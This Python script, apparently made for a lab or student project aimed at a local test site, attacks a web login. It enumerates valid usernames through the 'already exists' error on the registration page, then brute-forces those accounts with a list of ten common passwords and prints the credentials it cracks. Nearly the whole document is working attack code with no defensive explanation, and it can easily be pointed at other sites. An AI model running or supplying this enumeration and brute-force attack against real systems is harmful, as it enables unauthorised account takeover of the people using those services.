import requests

def run_attack(base_url="http://192.168.56.1/CyberProject/login.php", input_file="usernames.txt"):
    register_url = f"{base_url}?view=register"
    found_users = []
    cracked_accounts = []
    enum_error = "Username already exists in the system"
    common_passwords =  [ "123456", "admin123", "12345678", "123456789", "12345", "password", "Aa123456", "1234567890", "111111", "qwerty"]

    #--- step 1: Enumerating users via the registration page ---
    try:
        clean_page = requests.get(register_url).text

        with open(input_file, "r") as file:
            potential_names = list(set(line.strip() for line in file if line.strip()))
        
        print(f"[*] Step 1: Enumerating {len(potential_names)} users...")
        for name in potential_names:
            payload = {"reg_username": name, "reg_email": f"{name}@test.com", "reg_password": "p", "register_submit": ""}
            response = requests.post(register_url, data=payload)
            
            if enum_error in response.text and enum_error not in clean_page:
                if name not in found_users:
                    found_users.append(name)

        print(f" [!] Found valid usernames: {', '.join(found_users) if found_users else 'None'}")

        if not found_users:
            print("[x] No valid users found. Exiting.")
            return [], []

        # --- step 2: Brute forcing the found users with common passwords ---
        print(f"\n[*] Step 2: Starting Brute Force on {len(found_users)} users...")
        for user in found_users:
            for pwd in common_passwords:
                login_payload = {
                    "username": user,
                    "password": pwd,
                    "login_submit": ""
                }
                
                # we are using allow_redirects=False to detect the redirection to home.php
                response = requests.post(base_url, data=login_payload, allow_redirects=False)
                
                if response.status_code == 302 and "home.php" in response.headers.get('Location', ''):
                    print(f"  [SUCCESS] Cracked! {user}:{pwd}")
                    cracked_accounts.append((user, pwd))
                    break
        
        # --- Attack Summary ---
        print("\n" + "="*40)
        print("ATTACK SUMMARY")
        print(f"Users Found: {len(found_users)}")
        print(f"Accounts Cracked: {len(cracked_accounts)}")
        for acc in cracked_accounts:
            print(f" -> {acc[0]} : {acc[1]}")
        print("="*40)

        return cracked_accounts, found_users

    except Exception as e:
        print(f"[!] Error: {e}")
        return [], []

if __name__ == "__main__":
    cracked, found = run_attack()
